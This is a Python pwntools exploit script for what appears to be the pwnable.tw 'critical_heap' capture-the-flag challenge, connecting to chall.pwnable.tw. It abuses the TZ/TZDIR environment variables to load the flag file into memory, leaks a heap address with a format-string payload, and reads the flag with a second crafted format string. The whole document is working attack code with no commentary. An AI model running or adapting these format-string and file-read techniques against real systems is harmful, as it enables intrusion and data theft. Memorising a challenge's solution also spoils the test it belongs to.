from pwn import *
context.log_level='debug'
def cmd(c):
	p.sendlineafter("choice : ",str(c))
def add(name,tp=1,ct="A"):
	cmd(1)
	p.sendafter("Name of heap:",name)
	cmd(str(tp))
	if tp==1:
		p.sendafter("Content of heap :",ct)
def show(idx):
	cmd(2)
	p.sendlineafter("heap :",str(idx))
def play(idx):
	cmd(4)
	p.sendlineafter("heap :",str(idx))
def play_sys(idx,c=1,name="TZDIR",value='/home/critical_heap++/'):
	cmd(4)
	p.sendlineafter("heap :",str(idx))
	cmd(c)
	if c==1:
		p.sendlineafter("Give me a name for the system heap :",name)
		p.sendlineafter("Give me a value for this name :",value)
		cmd(5)
#0x000000000604040
#p=process("./critical_heap")
p=remote("chall.pwnable.tw",10500)
add("n132",3)#0
play_sys(0,1,"TZDIR",'/home/critical_heap++/')
play_sys(0,1,"TZ","flag")
add("T",2)#1
add("nier",1,"%p%p%p%p%p|%s|")#2
play(2)
cmd(1)
p.readuntil("|")
heap=u64(p.readuntil("|")[:-1].ljust(8,'\x00'))
log.warning(hex(heap))
aim=0x605610-0x605350+heap-0x10
cmd(2)
p.sendafter("Content :","%p%p%p%p%p%p%p%p%p%p%p%p%s%p%p%p"+p64(aim))
#gdb.attach(p,"b *0x00000000040194B")
cmd(1)
p.interactive()
